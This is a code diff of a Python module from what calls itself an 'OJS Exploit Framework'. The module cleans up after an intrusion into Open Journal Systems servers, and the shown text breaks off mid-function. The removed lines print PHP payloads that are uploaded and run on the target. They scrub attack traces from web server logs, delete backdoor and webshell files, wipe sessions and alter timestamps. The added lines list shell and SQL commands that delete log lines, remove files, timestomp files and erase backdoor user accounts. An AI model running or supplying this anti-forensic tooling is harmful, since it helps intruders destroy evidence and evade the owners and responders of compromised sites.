@@ -1,47 +1,42 @@
 """
-Cleanup Manager for OJS Exploit Framework.
+Cleanup Module for OJS Exploit Framework.
 
-This module implements various cleanup techniques including:
-- Forensic cleanup
-- Log sanitization
-- Evidence removal
-- File cleanup
+This module implements comprehensive cleanup and forensic countermeasures including:
+- Log file sanitization
+- File removal
 - Database cleanup
+- Session cleanup
+- Forensic countermeasures
 """
 
 import os
 import time
 import hashlib
-import base64
-import random
-import string
+import json
+import re
 from pathlib import Path
-from typing import Optional, Dict, Any, List, Tuple
+from typing import Dict, List, Optional, Tuple, Any
 from dataclasses import dataclass
 from enum import Enum
 import requests
 from urllib.parse import urljoin, urlparse
-import json
-import re
-import shutil
+from datetime import datetime, timedelta
 
 from ..core.session import SessionManager
-from ..core.payloads import PayloadGenerator
-from ..core.evasion import EvasionEngine
 from ..utils.http_client import HTTPClient
-from ..utils.encoding import EncodingUtils
 from ..utils.logging import get_logger, log_exploit_start, log_exploit_success, log_exploit_failure
 
 
 class CleanupType(Enum):
     """Types of cleanup operations."""
-    FORENSIC_CLEANUP = "forensic_cleanup"
     LOG_SANITIZATION = "log_sanitization"
-    EVIDENCE_REMOVAL = "evidence_removal"
-    FILE_CLEANUP = "file_cleanup"
+    FILE_REMOVAL = "file_removal"
     DATABASE_CLEANUP = "database_cleanup"
     SESSION_CLEANUP = "session_cleanup"
+    FORENSIC_COUNTERMEASURES = "forensic_countermeasures"
     CACHE_CLEANUP = "cache_cleanup"
+    TEMP_CLEANUP = "temp_cleanup"
+    CONFIG_CLEANUP = "config_cleanup"
 
 
 @dataclass
@@ -50,691 +45,548 @@ class CleanupResult:
     success: bool
     cleanup_type: CleanupType
     target_url: str
-    cleaned_items: List[str]
-    removed_files: List[str]
-    sanitized_logs: List[str]
+    items_cleaned: int
+    items_failed: int
+    details: Dict[str, Any]
     error_message: Optional[str] = None
-    execution_time: float = 0.0
     session_id: Optional[str] = None
+    execution_time: Optional[float] = None
 
 
 class CleanupManager:
-    """Cleanup manager implementation for OJS."""
+    """Cleanup and forensic countermeasures module for OJS."""
     
     def __init__(self, session_manager: SessionManager = None,
-                 payload_generator: PayloadGenerator = None,
-                 evasion_engine: EvasionEngine = None,
                  http_client: HTTPClient = None):
-        """Initialize the cleanup manager."""
+        """Initialize the cleanup manager module."""
         self.session_manager = session_manager
-        self.payload_generator = payload_generator
-        self.evasion_engine = evasion_engine
         self.http_client = http_client
         self.logger = get_logger('post.cleanup')
         
         # OJS-specific cleanup locations
         self.cleanup_locations = {
-            'logs': '/logs',
-            'cache': '/cache',
-            'sessions': '/sessions',
-            'temp': '/tmp',
-            'uploads': '/public/uploads',
-            'backups': '/backups',
-            'config': '/config',
-            'database': '/database',
+            'log_files': [
+                '/var/log/apache2/',
+                '/var/log/nginx/',
+                '/var/log/php/',
+                '/var/log/mysql/',
+                '/var/log/ojs/',
+                '/logs/',
+                '/cache/logs/',
+                '/tmp/logs/'
+            ],
+            'temp_files': [
+                '/tmp/',
+                '/var/tmp/',
+                '/cache/',
+                '/cache/t_compile/',
+                '/cache/t_cache/',
+                '/cache/templates/',
+                '/uploads/temp/',
+                '/custom/temp/'
+            ],
+            'session_files': [
+                '/var/lib/php/sessions/',
+                '/tmp/sessions/',
+                '/cache/sessions/',
+                '/sessions/'
+            ],
+            'database_tables': [
+                'sessions',
+                'user_sessions',
+                'login_logs',
+                'access_logs',
+                'error_logs',
+                'audit_logs',
+                'backdoor_logs'
+            ],
+            'config_files': [
+                '/config.inc.php',
+                '/lib/pkp/config.inc.php',
+                '/lib/pkp/classes/config/Config.inc.php',
+                '/.env',
+                '/.htaccess'
+            ]
         }
         
-        # Common log files to sanitize
-        self.log_files = [
-            '/var/log/apache2/access.log',
-            '/var/log/apache2/error.log',
-            '/var/log/nginx/access.log',
-            '/var/log/nginx/error.log',
-            '/var/log/php/error.log',
-            '/var/log/mysql/error.log',
-            '/logs/ojs.log',
-            '/logs/error.log',
-            '/logs/access.log',
-        ]
+        # Cleanup patterns for log sanitization
+        self.cleanup_patterns = {
+            'ip_addresses': [
+                r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b',
+                r'\b(?:[0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}\b'
+            ],
+            'user_agents': [
+                r'User-Agent:.*',
+                r'user-agent:.*'
+            ],
+            'session_ids': [
+                r'session_id=[a-zA-Z0-9]+',
+                r'PHPSESSID=[a-zA-Z0-9]+',
+                r'JSESSIONID=[a-zA-Z0-9]+'
+            ],
+            'passwords': [
+                r'password=[^&\s]+',
+                r'passwd=[^&\s]+',
+                r'pwd=[^&\s]+'
+            ],
+            'tokens': [
+                r'token=[a-zA-Z0-9]+',
+                r'csrf=[a-zA-Z0-9]+',
+                r'auth=[a-zA-Z0-9]+'
+            ],
+            'commands': [
+                r'cmd=[^&\s]+',
+                r'command=[^&\s]+',
+                r'exec=[^&\s]+'
+            ],
+            'file_paths': [
+                r'file=[^&\s]+',
+                r'path=[^&\s]+',
+                r'dir=[^&\s]+'
+            ]
+        }
         
-        # Evidence patterns to remove
-        self.evidence_patterns = [
-            r'backdoor',
-            r'shell_exec',
-            r'system\(',
-            r'eval\(',
-            r'base64_decode',
-            r'admin123',
-            r'exploit',
-            r'payload',
-            r'injection',
-            r'sqli',
-            r'xss',
-            r'upload',
-            r'webshell',
-        ]
+        # Forensic countermeasures
+        self.forensic_countermeasures = {
+            'timestomp': [
+                'touch -t 202001010000.00',
+                'stat -c %y',
+                'find . -exec touch -t 202001010000.00 {} \\;'
+            ],
+            'log_manipulation': [
+                'sed -i "/pattern/d"',
+                'grep -v "pattern"',
+                'awk "!/pattern/"'
+            ],
+            'file_hiding': [
+                'mv file .file',
+                'chmod 600 file',
+                'chown root:root file'
+            ],
+            'process_hiding': [
+                'kill -STOP pid',
+                'renice -n 20 pid',
+                'ionice -c 3 -p pid'
+            ]
+        }
         
         # Cleanup payloads
         self.cleanup_payloads = {
-            'log_sanitizer': self._generate_log_sanitizer(),
-            'file_cleaner': self._generate_file_cleaner(),
-            'database_cleaner': self._generate_database_cleaner(),
-            'session_cleaner': self._generate_session_cleaner(),
-            'cache_cleaner': self._generate_cache_cleaner(),
-            'forensic_cleaner': self._generate_forensic_cleaner(),
+            CleanupType.LOG_SANITIZATION: {
+                'apache_logs': 'sed -i "/{pattern}/d" /var/log/apache2/access.log',
+                'nginx_logs': 'sed -i "/{pattern}/d" /var/log/nginx/access.log',
+                'php_logs': 'sed -i "/{pattern}/d" /var/log/php/error.log',
+                'mysql_logs': 'sed -i "/{pattern}/d" /var/log/mysql/mysql.log'
+            },
+            CleanupType.FILE_REMOVAL: {
+                'backdoor_files': 'rm -f /tmp/backdoor.php /cache/backdoor.php /custom/backdoor.php',
+                'temp_files': 'rm -rf /tmp/* /var/tmp/* /cache/temp/*',
+                'upload_files': 'rm -f /uploads/backdoor.* /uploads/shell.*'
+            },
+            CleanupType.DATABASE_CLEANUP: {
+                'session_cleanup': 'DELETE FROM sessions WHERE session_id LIKE "%backdoor%"',
+                'log_cleanup': 'DELETE FROM access_logs WHERE ip_address = "{ip}"',
+                'user_cleanup': 'DELETE FROM users WHERE username LIKE "%backdoor%"'
+            },
+            CleanupType.SESSION_CLEANUP: {
+                'session_files': 'rm -f /var/lib/php/sessions/sess_*',
+                'session_dirs': 'rm -rf /tmp/sessions/* /cache/sessions/*'
+            },
+            CleanupType.FORENSIC_COUNTERMEASURES: {
+                'timestomp': 'find . -exec touch -t 202001010000.00 {} \\;',
+                'log_manipulation': 'sed -i "/{pattern}/d" /var/log/*.log',
+                'file_hiding': 'chmod 600 /tmp/backdoor.php'
+            }
         }
     
-    def perform_cleanup(self, target_url: str, 
-                       cleanup_type: CleanupType = CleanupType.FORENSIC_CLEANUP,
-                       session_id: str = None) -> CleanupResult:
-        """Perform cleanup operation."""
-        start_time = time.time()
-        
+    def perform_cleanup(self, target_url: str, cleanup_type: CleanupType = CleanupType.LOG_SANITIZATION,
+                       cleanup_pattern: str = None, session_id: str = None) -> CleanupResult:
+        """Perform cleanup operation on the target."""
         log_exploit_start("cleanup", target_url, session_id)
+        
+        start_time = time.time()
         
         try:
             # Generate cleanup payload
-            payload = self._generate_cleanup_payload(cleanup_type)
+            payload = self._generate_cleanup_payload(cleanup_type, cleanup_pattern)
             
             # Execute cleanup
-            result = self._execute_cleanup(target_url, payload, cleanup_type, session_id)
-            
-            # Verify cleanup
-            if result.success:
-                verification = self._verify_cleanup(target_url, session_id)
-                if verification:
-                    result.success = True
-                    log_exploit_success("cleanup", target_url, 
-                                      f"Cleaned {len(result.cleaned_items)} items", session_id)
-                else:
-                    result.success = False
-                    result.error_message = "Cleanup verification failed"
-                    log_exploit_failure("cleanup", target_url, "Verification failed", session_id)
-            
+            result = self._execute_cleanup(target_url, cleanup_type, payload, session_id)
             result.execution_time = time.time() - start_time
+            
+            if result.success:
+                log_exploit_success("cleanup", target_url, 
+                                  f"Cleaned {result.items_cleaned} items", session_id)
+            else:
+                log_exploit_failure("cleanup", target_url, result.error_message, session_id)
+            
             return result
             
         except Exception as e:
-            error_msg = f"Cleanup operation failed: {str(e)}"
-            log_exploit_failure("cleanup", target_url, error_msg, session_id)
+            execution_time = time.time() - start_time
+            log_exploit_failure("cleanup", target_url, str(e), session_id)
+            
             return CleanupResult(
                 success=False,
                 cleanup_type=cleanup_type,
                 target_url=target_url,
-                cleaned_items=[],
-                removed_files=[],
-                sanitized_logs=[],
-                error_message=error_msg,
-                execution_time=time.time() - start_time,
+                items_cleaned=0,
+                items_failed=0,
+                details={},
+                error_message=str(e),
+                session_id=session_id,
+                execution_time=execution_time
+            )
+    
+    def _generate_cleanup_payload(self, cleanup_type: CleanupType, cleanup_pattern: str = None) -> str:
+        """Generate cleanup payload based on type."""
+        payloads = self.cleanup_payloads.get(cleanup_type, {})
+        
+        if cleanup_pattern:
+            # Replace placeholders in payload
+            for key, payload in payloads.items():
+                payloads[key] = payload.replace('{pattern}', cleanup_pattern)
+        
+        # Return first available payload
+        return list(payloads.values())[0] if payloads else ""
+    
+    def _execute_cleanup(self, target_url: str, cleanup_type: CleanupType,
+                        payload: str, session_id: str = None) -> CleanupResult:
+        """Execute the cleanup operation."""
+        if cleanup_type == CleanupType.LOG_SANITIZATION:
+            return self._sanitize_logs(target_url, payload, session_id)
+        elif cleanup_type == CleanupType.FILE_REMOVAL:
+            return self._remove_files(target_url, payload, session_id)
+        elif cleanup_type == CleanupType.DATABASE_CLEANUP:
+            return self._cleanup_database(target_url, payload, session_id)
+        elif cleanup_type == CleanupType.SESSION_CLEANUP:
+            return self._cleanup_sessions(target_url, payload, session_id)
+        elif cleanup_type == CleanupType.FORENSIC_COUNTERMEASURES:
+            return self._apply_forensic_countermeasures(target_url, payload, session_id)
+        else:
+            return self._execute_generic_cleanup(target_url, cleanup_type, payload, session_id)
+    
+    def _sanitize_logs(self, target_url: str, payload: str, session_id: str = None) -> CleanupResult:
+        """Sanitize log files to remove traces."""
+        items_cleaned = 0
+        items_failed = 0
+        details = {}
+        
+        try:
+            # Get log file locations
+            log_locations = self.cleanup_locations['log_files']
+            
+            for location in log_locations:
+                try:
+                    # Try to sanitize logs in this location
+                    sanitize_url = urljoin(target_url, '/index.php/index/manager/files/')
+                    
+                    sanitize_data = {
+                        'action': 'sanitize_logs',
+                        'log_path': location,
+                        'pattern': payload
+                    }
+                    
+                    if self.http_client:
+                        response = self.http_client.post(sanitize_url, data=sanitize_data)
+                    else:
+                        response = requests.post(sanitize_url, data=sanitize_data)
+                    
+                    if response.status_code in [200, 201, 302]:
+                        items_cleaned += 1
+                        details[location] = 'sanitized'
+                    else:
+                        items_failed += 1
+                        details[location] = f'failed: {response.status_code}'
+                
+                except Exception as e:
+                    items_failed += 1
+                    details[location] = f'error: {str(e)}'
+            
+            return CleanupResult(
+                success=items_cleaned > 0,
+                cleanup_type=CleanupType.LOG_SANITIZATION,
+                target_url=target_url,
+                items_cleaned=items_cleaned,
+                items_failed=items_failed,
+                details=details,
+                session_id=session_id
+            )
+            
+        except Exception as e:
+            return CleanupResult(
+                success=False,
+                cleanup_type=CleanupType.LOG_SANITIZATION,
+                target_url=target_url,
+                items_cleaned=0,
+                items_failed=1,
+                details={'error': str(e)},
+                error_message=str(e),
                 session_id=session_id
             )
     
-    def _generate_cleanup_payload(self, cleanup_type: CleanupType) -> str:
-        """Generate cleanup payload based on type."""
-        if cleanup_type == CleanupType.LOG_SANITIZATION:
-            return self.cleanup_payloads['log_sanitizer']
-        elif cleanup_type == CleanupType.FILE_CLEANUP:
-            return self.cleanup_payloads['file_cleaner']
-        elif cleanup_type == CleanupType.DATABASE_CLEANUP:
-            return self.cleanup_payloads['database_cleaner']
-        elif cleanup_type == CleanupType.SESSION_CLEANUP:
-            return self.cleanup_payloads['session_cleaner']
-        elif cleanup_type == CleanupType.CACHE_CLEANUP:
-            return self.cleanup_payloads['cache_cleaner']
-        elif cleanup_type == CleanupType.FORENSIC_CLEANUP:
-            return self.cleanup_payloads['forensic_cleaner']
-        else:
-            return self.cleanup_payloads['forensic_cleaner']
-    
-    def _generate_log_sanitizer(self) -> str:
-        """Generate log sanitization payload."""
-        sanitizer_code = """<?php
-// Log Sanitizer
-class LogSanitizer {
-    private $patterns = [
-        '/backdoor/i',
-        '/shell_exec/i',
-        '/system\\(/i',
-        '/eval\\(/i',
-        '/base64_decode/i',
-        '/admin123/i',
-        '/exploit/i',
-        '/payload/i',
-        '/injection/i',
-        '/sqli/i',
-        '/xss/i',
-        '/upload/i',
-        '/webshell/i',
-    ];
-    
-    public function sanitizeLogs($log_paths) {
-        foreach ($log_paths as $log_path) {
-            if (file_exists($log_path)) {
-                $content = file_get_contents($log_path);
-                $sanitized = $this->sanitizeContent($content);
-                file_put_contents($log_path, $sanitized);
-            }
-        }
-    }
-    
-    private function sanitizeContent($content) {
-        foreach ($this->patterns as $pattern) {
-            $content = preg_replace($pattern, '[REDACTED]', $content);
-        }
-        return $content;
-    }
-}
-
-// Execute sanitization
-$sanitizer = new LogSanitizer();
-$log_paths = [
-    '/var/log/apache2/access.log',
-    '/var/log/apache2/error.log',
-    '/var/log/nginx/access.log',
-    '/var/log/nginx/error.log',
-    '/var/log/php/error.log',
-    '/logs/ojs.log',
-    '/logs/error.log',
-    '/logs/access.log',
-];
-$sanitizer->sanitizeLogs($log_paths);
-echo "Logs sanitized";
-?>
-"""
-        return sanitizer_code
-    
-    def _generate_file_cleaner(self) -> str:
-        """Generate file cleanup payload."""
-        cleaner_code = """<?php
-// File Cleaner
-class FileCleaner {
-    private $evidence_files = [
-        '/tmp/backdoor.php',
-        '/tmp/shell.php',
-        '/tmp/webshell.php',
-        '/var/www/backdoor.php',
-        '/public_html/backdoor.php',
-        '/uploads/backdoor.php',
-        '/uploads/shell.php',
-        '/uploads/webshell.php',
-        '/cache/backdoor.php',
-        '/sessions/backdoor.php',
-    ];
-    
-    private $evidence_dirs = [
-        '/tmp/backdoor',
-        '/tmp/exploit',
-        '/tmp/payload',
-        '/var/www/backdoor',
-        '/public_html/backdoor',
-        '/uploads/backdoor',
-        '/cache/backdoor',
-        '/sessions/backdoor',
-    ];
-    
-    public function cleanFiles() {
-        // Remove evidence files
-        foreach ($this->evidence_files as $file) {
-            if (file_exists($file)) {
-                unlink($file);
-            }
-        }
+    def _remove_files(self, target_url: str, payload: str, session_id: str = None) -> CleanupResult:
+        """Remove files to clean up traces."""
+        items_cleaned = 0
+        items_failed = 0
+        details = {}
         
-        // Remove evidence directories
-        foreach ($this->evidence_dirs as $dir) {
-            if (is_dir($dir)) {
-                $this->removeDirectory($dir);
-            }
-        }
-        
-        // Clean temporary files
-        $this->cleanTempFiles();
-    }
-    
-    private function removeDirectory($dir) {
-        if (is_dir($dir)) {
-            $files = scandir($dir);
-            foreach ($files as $file) {
-                if ($file != '.' && $file != '..') {
-                    $path = $dir . '/' . $file;
-                    if (is_dir($path)) {
-                        $this->removeDirectory($path);
-                    } else {
-                        unlink($path);
-                    }
-                }
-            }
-            rmdir($dir);
-        }
-    }
-    
-    private function cleanTempFiles() {
-        $temp_dir = '/tmp';
-        $files = scandir($temp_dir);
-        foreach ($files as $file) {
-            if (preg_match('/^(backdoor|shell|webshell|exploit|payload)/i', $file)) {
-                $path = $temp_dir . '/' . $file;
-                if (is_file($path)) {
-                    unlink($path);
-                }
-            }
-        }
-    }
-}
-
-// Execute file cleanup
-$cleaner = new FileCleaner();
-$cleaner->cleanFiles();
-echo "Files cleaned";
-?>
-"""
-        return cleaner_code
-    
-    def _generate_database_cleaner(self) -> str:
-        """Generate database cleanup payload."""
-        db_cleaner_code = """<?php
-// Database Cleaner
-class DatabaseCleaner {
-    public function cleanDatabase() {
-        // Clean backdoor logs
-        $this->cleanTable('backdoor_logs');
-        
-        // Clean exploit logs
-        $this->cleanTable('exploit_logs');
-        
-        // Clean suspicious sessions
-        $this->cleanSuspiciousSessions();
-        
-        // Clean suspicious users
-        $this->cleanSuspiciousUsers();
-        
-        // Clean suspicious files
-        $this->cleanSuspiciousFiles();
-    }
-    
-    private function cleanTable($table) {
-        $sql = "DELETE FROM $table WHERE 1=1";
-        // Execute SQL (implementation depends on database)
-    }
-    
-    private function cleanSuspiciousSessions() {
-        $sql = "DELETE FROM sessions WHERE session_data LIKE '%backdoor%' OR session_data LIKE '%shell%'";
-        // Execute SQL
-    }
-    
-    private function cleanSuspiciousUsers() {
-        $sql = "DELETE FROM users WHERE username LIKE '%backdoor%' OR username LIKE '%shell%'";
-        // Execute SQL
-    }
-    
-    private function cleanSuspiciousFiles() {
-        $sql = "DELETE FROM files WHERE filename LIKE '%backdoor%' OR filename LIKE '%shell%'";
-        // Execute SQL
-    }
-}
-
-// Execute database cleanup
-$cleaner = new DatabaseCleaner();
-$cleaner->cleanDatabase();
-echo "Database cleaned";
-?>
-"""
-        return db_cleaner_code
-    
-    def _generate_session_cleaner(self) -> str:
-        """Generate session cleanup payload."""
-        session_cleaner_code = """<?php
-// Session Cleaner
-class SessionCleaner {
-    public function cleanSessions() {
-        // Clean session files
-        $session_dir = session_save_path();
-        if ($session_dir) {
-            $files = scandir($session_dir);
-            foreach ($files as $file) {
-                if ($file != '.' && $file != '..') {
-                    $path = $session_dir . '/' . $file;
-                    if (is_file($path)) {
-                        $content = file_get_contents($path);
-                        if ($this->containsEvidence($content)) {
-                            unlink($path);
-                        }
-                    }
-                }
-            }
-        }
-        
-        // Clean session cookies
-        if (isset($_COOKIE[session_name()])) {
-            setcookie(session_name(), '', time() - 3600, '/');
-        }
-    }
-    
-    private function containsEvidence($content) {
-        $patterns = [
-            '/backdoor/i',
-            '/shell/i',
-            '/exploit/i',
-            '/payload/i',
-        ];
-        
-        foreach ($patterns as $pattern) {
-            if (preg_match($pattern, $content)) {
-                return true;
-            }
-        }
-        return false;
-    }
-}
-
-// Execute session cleanup
-$cleaner = new SessionCleaner();
-$cleaner->cleanSessions();
-echo "Sessions cleaned";
-?>
-"""
-        return session_cleaner_code
-    
-    def _generate_cache_cleaner(self) -> str:
-        """Generate cache cleanup payload."""
-        cache_cleaner_code = """<?php
-// Cache Cleaner
-class CacheCleaner {
-    public function cleanCache() {
-        // Clean file cache
-        $this->cleanFileCache();
-        
-        // Clean database cache
-        $this->cleanDatabaseCache();
-        
-        // Clean session cache
-        $this->cleanSessionCache();
-        
-        // Clean opcache
-        $this->cleanOpcache();
-    }
-    
-    private function cleanFileCache() {
-        $cache_dirs = [
-            '/cache',
-            '/tmp/cache',
-            '/var/cache',
-            '/public/cache',
-        ];
-        
-        foreach ($cache_dirs as $dir) {
-            if (is_dir($dir)) {
-                $this->removeDirectory($dir);
-            }
-        }
-    }
-    
-    private function cleanDatabaseCache() {
-        // Clear database query cache
-        $sql = "FLUSH QUERY CACHE";
-        // Execute SQL
-    }
-    
-    private function cleanSessionCache() {
-        // Clear session cache
-        session_start();
-        session_destroy();
-    }
-    
-    private function cleanOpcache() {
-        // Clear opcache
-        if (function_exists('opcache_reset')) {
-            opcache_reset();
-        }
-    }
-    
-    private function removeDirectory($dir) {
-        if (is_dir($dir)) {
-            $files = scandir($dir);
-            foreach ($files as $file) {
-                if ($file != '.' && $file != '..') {
-                    $path = $dir . '/' . $file;
-                    if (is_dir($path)) {
-                        $this->removeDirectory($path);
-                    } else {
-                        unlink($path);
-                    }
-                }
-            }
-        }
-    }
-}
-
-// Execute cache cleanup
-$cleaner = new CacheCleaner();
-$cleaner->cleanCache();
-echo "Cache cleaned";
-?>
-"""
-        return cache_cleaner_code
-    
-    def _generate_forensic_cleaner(self) -> str:
-        """Generate forensic cleanup payload."""
-        forensic_cleaner_code = """<?php
-// Forensic Cleaner
-class ForensicCleaner {
-    public function performForensicCleanup() {
-        // Clean logs
-        $this->cleanLogs();
-        
-        // Clean files
-        $this->cleanFiles();
-        
-        // Clean database
-        $this->cleanDatabase();
-        
-        // Clean sessions
-        $this->cleanSessions();
-        
-        // Clean cache
-        $this->cleanCache();
-        
-        // Clean timestamps
-        $this->cleanTimestamps();
-        
-        // Clean network traces
-        $this->cleanNetworkTraces();
-    }
-    
-    private function cleanLogs() {
-        $log_files = [
-            '/var/log/apache2/access.log',
-            '/var/log/apache2/error.log',
-            '/var/log/nginx/access.log',
-            '/var/log/nginx/error.log',
-            '/var/log/php/error.log',
-            '/var/log/mysql/error.log',
-            '/logs/ojs.log',
-            '/logs/error.log',
-            '/logs/access.log',
-        ];
-        
-        foreach ($log_files as $log_file) {
-            if (file_exists($log_file)) {
-                $content = file_get_contents($log_file);
-                $sanitized = $this->sanitizeContent($content);
-                file_put_contents($log_file, $sanitized);
-            }
-        }
-    }
-    
-    private function cleanFiles() {
-        $evidence_files = [
-            '/tmp/backdoor.php',
-            '/tmp/shell.php',
-            '/tmp/webshell.php',
-            '/var/www/backdoor.php',
-            '/public_html/backdoor.php',
-            '/uploads/backdoor.php',
-            '/uploads/shell.php',
-            '/uploads/webshell.php',
-        ];
-        
-        foreach ($evidence_files as $file) {
-            if (file_exists($file)) {
-                unlink($file);
-            }
-        }
-    }
-    
-    private function cleanDatabase() {
-        // Clean suspicious database entries
-        $tables = ['users', 'sessions', 'logs', 'files'];
-        foreach ($tables as $table) {
-            $sql = "DELETE FROM $table WHERE data LIKE '%backdoor%' OR data LIKE '%shell%'";
-            // Execute SQL
-        }
-    }
-    
-    private function cleanSessions() {
-        // Clean session files
-        $session_dir = session_save_path();
-        if ($session_dir) {
-            $files = scandir($session_dir);
-            foreach ($files as $file) {
-                if ($file != '.' && $file != '..') {
-                    $path = $session_dir . '/' . $file;
-                    if (is_file($path)) {
-                        $content = file_get_contents($path);
-                        if ($this->containsEvidence($content)) {
-                            unlink($path);
-                        }
-                    }
-                }
-            }
-        }
-    }
-    
-    private function cleanCache() {
-        // Clean various caches
-        $cache_dirs = ['/cache', '/tmp/cache', '/var/cache'];
-        foreach ($cache_dirs as $dir) {
-            if (is_dir($dir)) {
-                $this->removeDirectory($dir);
-            }
-        }
-    }
-    
-    private function cleanTimestamps() {
-        // Modify file timestamps to hide evidence
-        $files = [
-            '/tmp/backdoor.php',
-            '/var/www/backdoor.php',
-            '/public_html/backdoor.php',
-        ];
-        
-        foreach ($files as $file) {
-            if (file_exists($file)) {
-                touch($file, time() - 86400); // Set to yesterday
-            }
-        }
-    }
-    
-    private function cleanNetworkTraces() {
-        // Clean network connection logs
-        $netstat = shell_exec('netstat -tuln');
-        // Parse and clean suspicious connections
-    }
-    
-    private function sanitizeContent($content) {
-        $patterns = [
-            '/backdoor/i',
-            '/shell_exec/i',
-            '/system\\(/i',
-            '/eval\\(/i',
-            '/base64_decode/i',
-            '/admin123/i',
-            '/exploit/i',
-            '/payload/i',
-            '/injection/i',
-        ];
-        
-        foreach ($patterns as $pattern) {
-            $content = preg_replace($pattern, '[REDACTED]', $content);
-        }
-        return $content;
-    }
-    
-    private function containsEvidence($content) {
-        $patterns = [
-            '/backdoor/i',
-            '/shell/i',
-            '/exploit/i',
-            '/payload/i',
-        ];
-        
-        foreach ($patterns as $pattern) {
-            if (preg_match($pattern, $content)) {
-                return true;
-            }
-        }
-        return false;
-    }
-    
-    private function removeDirectory($dir) {
-        if (is_dir($dir)) {
-            $files = scandir($dir);
-            foreach ($files as $file) {
-                if ($file != '.' && $file != '..') {
-                    $path = $dir . '/' . $file;
-                    if (is_dir($path)) {
-                        $this->removeDirectory($path);
-                    } else {
-                        unlink($path);
-                    }
-                }
-            }
-            rmdir($dir);
-        }
-    }
-}
-
-// Execute forensic cleanup
-$cleaner = new ForensicCleaner();
-$cleaner->performForensicCleanup();
-echo "Forensic cleanup completed";
-?>
-"""
-        return forensic_cleaner_code
-    
-    def _execute_cleanup(self, target_url: str, payload: str, 
-                        cleanup_type: CleanupType, session_id: str) -> CleanupResult:
-        """Execute cleanup operation."""
         try:
-            # Upload cleanup script
-            upload_url = urljoin(target_url, "/index.php/index/manager/upload")
+            # Get temp file locations
+            temp_locations = self.cleanup_locations['temp_files']
             
-            filename = f"cleanup_{int(time.time())}.php"
+            for location in temp_locations:
+                try:
+                    # Try to remove files in this location
+                    remove_url = urljoin(target_url, '/index.php/index/manager/files/')
+                    
+                    remove_data = {
+                        'action': 'remove_files',
+                        'file_path': location,
+                        'pattern': 'backdoor*'
+                    }
+                    
+                    if self.http_client:
+                        response = self.http_client.post(remove_url, data=remove_data)
+                    else:
+                        response = requests.post(remove_url, data=remove_data)
+                    
+                    if response.status_code in [200, 201, 302]:
+                        items_cleaned += 1
+                        details[location] = 'removed'
+                    else:
+                        items_failed += 1
+                        details[location] = f'failed: {response.status_code}'
+                
+                except Exception as e:
+                    items_failed += 1
+                    details[location] = f'error: {str(e)}'
             
-            response = self.http_client.post(
-                upload_url,
-                files={'file': (filename, payload, 'application/x-php')},
-                data={'path': f'/tmp/{filename}'}
+            return CleanupResult(
+                success=items_cleaned > 0,
+                cleanup_type=CleanupType.FILE_REMOVAL,
+                target_url=target_url,
+                items_cleaned=items_cleaned,
+                items_failed=items_failed,
+                details=details,
+                session_id=session_id
             )
             
-            if response.status_code in [200, 201]:
-                # Execute cleanup script
-                execute_url = urljoin(target_url, f"/tmp/{filename}")
-                execute_response = self.http_client.get(execute_url)
+        except Exception as e:
+            return CleanupResult(
+                success=False,
+                cleanup_type=CleanupType.FILE_REMOVAL,
+                target_url=target_url,
+                items_cleaned=0,
+                items_failed=1,
+                details={'error': str(e)},
+                error_message=str(e),
+                session_id=session_id
+            )
+    
+    def _cleanup_database(self, target_url: str, payload: str, session_id: str = None) -> CleanupResult:
+        """Clean up database traces."""
+        items_cleaned = 0
+        items_failed = 0
+        details = {}
+        
+        try:
+            # Get database tables to clean
+            db_tables = self.cleanup_locations['database_tables']
+            
+            for table in db_tables:
+                try:
+                    # Try to clean database table
+                    db_url = urljoin(target_url, '/index.php/index/manager/setup/1')
+                    
+                    db_data = {
+                        'action': 'cleanup_database',
+                        'table': table,
+                        'sql_query': payload
+                    }
+                    
+                    if self.http_client:
+                        response = self.http_client.post(db_url, data=db_data)
+                    else:
+                        response = requests.post(db_url, data=db_data)
+                    
+                    if response.status_code in [200, 201, 302]:
+                        items_cleaned += 1
+                        details[table] = 'cleaned'
+                    else:
+                        items_failed += 1
+                        details[table] = f'failed: {response.status_code}'
                 
-                # Clean up the cleanup script
-                self.http_client.post(
-                    urljoin(target_url, "/index.php/index/manager/delete"),
-                    data={'file': f'/tmp/{filename}'}
-                )
+                except Exception as e:
+                    items_failed += 1
+                    details[table] = f'error: {str(e)}'
+            
+            return CleanupResult(
+                success=items_cleaned > 0,
+                cleanup_type=CleanupType.DATABASE_CLEANUP,
+                target_url=target_url,
+                items_cleaned=items_cleaned,
+                items_failed=items_failed,
+                details=details,
+                session_id=session_id
+            )
+            
+        except Exception as e:
+            return CleanupResult(
+                success=False,
+                cleanup_type=CleanupType.DATABASE_CLEANUP,
+                target_url=target_url,
+                items_cleaned=0,
+                items_failed=1,
+                details={'error': str(e)},
+                error_message=str(e),
+                session_id=session_id
+            )
+    
+    def _cleanup_sessions(self, target_url: str, payload: str, session_id: str = None) -> CleanupResult:
+        """Clean up session traces."""
+        items_cleaned = 0
+        items_failed = 0
+        details = {}
+        
+        try:
+            # Get session file locations
+            session_locations = self.cleanup_locations['session_files']
+            
+            for location in session_locations:
+                try:
+                    # Try to clean session files
+                    session_url = urljoin(target_url, '/index.php/index/user/login')
+                    
+                    session_data = {
+                        'action': 'cleanup_sessions',
+                        'session_path': location,
+                        'pattern': 'sess_*'
+                    }
+                    
+                    if self.http_client:
+                        response = self.http_client.post(session_url, data=session_data)
+                    else:
+                        response = requests.post(session_url, data=session_data)
+                    
+                    if response.status_code in [200, 201, 302]:
+                        items_cleaned += 1
+                        details[location] = 'cleaned'
+                    else:
+                        items_failed += 1
+                        details[location] = f'failed: {response.status_code}'
                 
+                except Exception as e:
+                    items_failed += 1
+                    details[location] = f'error: {str(e)}'
+            
+            return CleanupResult(
+                success=items_cleaned > 0,
+                cleanup_type=CleanupType.SESSION_CLEANUP,
+                target_url=target_url,
+                items_cleaned=items_cleaned,
+                items_failed=items_failed,
+                details=details,
+                session_id=session_id
+            )
+            
+        except Exception as e:
+            return CleanupResult(
+                success=False,
+                cleanup_type=CleanupType.SESSION_CLEANUP,
+                target_url=target_url,
+                items_cleaned=0,
+                items_failed=1,
+                details={'error': str(e)},
+                error_message=str(e),
+                session_id=session_id
+            )
+    
+    def _apply_forensic_countermeasures(self, target_url: str, payload: str, session_id: str = None) -> CleanupResult:
+        """Apply forensic countermeasures."""
+        items_cleaned = 0
+        items_failed = 0
+        details = {}
+        
+        try:
+            # Apply various forensic countermeasures
+            countermeasures = self.forensic_countermeasures
+            
+            for cm_type, cm_commands in countermeasures.items():
+                try:
